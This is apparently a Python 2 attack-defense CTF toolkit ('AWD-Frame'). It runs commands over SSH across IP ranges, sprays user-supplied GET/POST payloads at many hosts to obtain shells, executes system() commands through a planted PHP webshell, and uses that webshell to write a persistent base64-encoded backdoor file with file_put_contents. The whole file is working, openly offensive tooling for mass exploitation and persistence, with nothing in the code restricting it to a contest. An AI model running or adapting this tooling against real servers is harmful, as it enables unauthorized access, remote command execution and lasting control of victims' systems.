#coding:utf-8

import requests
import paramiko
import threading
import  time
ip_success = []

banner = """
    ___        ______        _____
   / \ \      / /  _ \      |  ___| __ __ _ _ __ ___   ___
  / _ \ \ /\ / /| | | |_____| |_ | '__/ _` | '_ ` _ \ / _ \\
 / ___ \ V  V / | |_| |_____|  _|| | | (_| | | | | | |  __/
/_/   \_\_/\_/  |____/      |_|  |_|  \__,_|_| |_| |_|\___|     v0.0.1 powered by xnianq. 
                                                                QQ:597211389,xnianq.cn
"""
def ssh(ip,username,passwd,cmd):  #批量修改ssh密码/执行命令
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip,22,username,passwd,timeout=5)
        for m in cmd:
            stdin, stdout, stderr = ssh.exec_command(m)
#           stdin.write("Y")   #简单交互，输入 ‘Y’
            out = stdout.readlines()
            #屏幕输出
            for o in out:
                print o,
        print '%s\tOK\n'%(ip)
        ssh.close()
    except :
        print '%s\tError\n'%(ip)
def split(ip): # 判断是一个IP还是一个IP段
    ips = len(ip.split('-'))
    iplist= []
    if ips == 1:
        iplist.append(ip)
        return iplist
    else:
        ipfinal = ip.split('-')[0][:-int(ip.split('-')[0].split('.')[-1])]
        for i in range(int(ip.split('-')[0].split('.')[-1]), int(ip.split('-')[1]) + 1):
            iplist.append(ipfinal+str(i))
        return iplist
def ssh_execmd(): # 调用ssh函数执行命令
    ip = raw_input("[*] please input the ip(192.168.0.1-225)")
    iplist = split(ip)
    username = raw_input("your name:")
    passwd = raw_input("your passwd:")
    cmd1 =  raw_input("you want to exec:")
    cmd = []
    cmd.append(cmd1)
    print "Begin......"
    if len(iplist)==1:
        ssh(ip,username=username,passwd=passwd,cmd=cmd) # 单个IP的情况
    else:
        for i in iplist:
            a = threading.Thread(target=ssh, args=(i, username, passwd, cmd))
            a.start()


def attack():#这一模块用来批量攻击主机，并且getshell.
    ip = raw_input("[*] please input the ip(192.168.0.1-225)and port:(默认为80端口)")
    print"""
[*] you have 2 function to choose:
1.Get
2.Post
       """
    method = raw_input("[*] your choice:")
    payloadfile = raw_input("[*] input the path,exmple:/index.php   ")
    payload = raw_input("[*] input your payload: ")
    iplist = split(ip)
    for i in iplist:
        a = threading.Thread(target=do_attack,args=("http://"+i+payloadfile,payload,method))
        a.start()


def do_attack(url,payload,method): # this path use to attack the ips with payload
    attacking  = requests.session()
    if method == '1':
        try:
            get =attacking.get(url+"?"+payload,timeout=1)
            print get.content
        except:
            print "[*]"+url+" sorry!attack false!"
    else:
        data  = {}
        payload1  = payload.split("&")
        for i in xrange(len(payload1)):
            data1 = payload1[i].split("=")
            data[data1[0]] = data1[1]
        try:
            post = attacking.post(url=url,data=data,timeout=1)
            print post.content
        except:
            print "[*]"+url+"sorry!attack false!"

def do_exec(url,passwd,cmd): #执行小马命令
    for i in url:
        a = requests.post(i,data={passwd:"system("+cmd+")"})
        print a.content

def submit_flag(flag):
    platform = raw_input("[*]please input your platform url:")
    cookie = raw_input("[*]please give me your cookies:").split(";")
    cookies = {}
    for i in xrange(len(cookie)):
        cookie1 = cookie[i].split("=")
        cookies[cookie1[0]] = cookie1[1]
    for i in flag:
        try:
            submit = requests.post(url=platform,cookies=cookies,data=i)
            print submit.content
        except:
            print "[*] sorry,submit flag error!"

def make_sudo(filename,url,passwd):#通过小马种植不死马
    f= open(filename,'r')
    php = f.read()
    php = php.encode('base64')[:-1]
    data = {passwd:"file_put_contents(\"test.php\",base64_decode(\""+php+"\"));"}
    try:
        attack = requests.post(url=url,data=data,timeout=0.1)
        if attack.status_code !=200:
            print "sorry the file is not exit!"
        else:
            print "please visit "+ url+"/xnianq.php to get longer control.and "+url+"/xnianqhh.php password is xnianqtest"
    except:
        print url+"-----error"

if __name__=='__main__':
    print banner
    while 1:
        choice = raw_input(
        """
[1] ssh : login to vps and exec command
[2] attack : input payload and get shell
[3] make_sudo : use webshell to make memory webshell 
[4] submit flag
[5] exit
"""
        )
        if choice=='1':
            ssh_execmd()
            continue
        elif choice =='2':
            attack()
            time.sleep(3)
        elif choice == "3":
            ip = raw_input("[*] please input your control ip(192.168.0.1-225): ")
            iplist = split(ip)
            path  = raw_input("[*] please input your shell path, example :/index.php:  ")
            passwd = raw_input("[*] please input your webshell password:")
            for i in iplist:
                a = threading.Thread(target=make_sudo, args=('xnianq.php',"http://" + i + path, passwd))
                a.start()

            #make_sudo()
            time.sleep(3)
        elif choice == "4":
            flag = []
            submit_flag(flag)
        elif choice=="5":
            exit()